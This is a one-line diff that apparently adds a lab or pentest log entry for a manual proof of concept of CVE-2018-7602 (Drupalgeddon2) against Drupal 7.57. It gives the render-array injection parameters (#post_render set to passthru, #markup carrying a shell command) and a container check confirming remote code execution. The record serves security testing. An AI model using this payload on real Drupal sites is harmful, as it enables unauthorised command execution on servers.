@@ -1,0 +1,1 @@
+manual PoC CVE-2018-7602 (Drupalgeddon2 D7.57): cancel-form destination poisoning -> q[#post_render][]=passthru q[#markup]=touch /tmp/d7pwned_7602.txt ; container check: /tmp/d7pwned_7602.txt EXISTS (RCE confirmed)
